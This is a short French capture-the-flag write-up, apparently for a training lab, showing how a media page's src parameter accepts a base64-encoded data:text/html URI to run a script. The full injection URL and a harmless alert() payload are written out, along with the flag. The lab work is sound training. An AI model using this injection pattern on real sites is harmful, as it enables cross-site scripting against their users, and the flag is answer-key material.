# XSS BASE64

## Flag
```
928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
```

## Découverte

Sur la page http://{IP_ADDRESS} l'image de l'aigle de la NSA avec un casque \
redirige sur http://{IP_ADDRESS}/?page=media&src=nsa.
On peut modifier le src nsa par un script en base64.
```
<script> alert("well done"); </script>
                 ==
PHNjcmlwdD4gYWxlcnQoIndlbGwgZG9uZSIpOyA8L3NjcmlwdD4=
```
On va donc a l'url \
http://{IP_ADDRESS}/?page=media&src=data:text/html;base64,PHNjcmlwdD4gYWxlcnQoIndlbGwgZG9uZSIpOyA8L3NjcmlwdD4= .


## Documentation
- [owasp - Cross-site_Scripting](https://wiki.owasp.org/index.php/Cross-site_Scripting_(XSS))

---

[RETURN](https://github.com/jlange91/darkly)
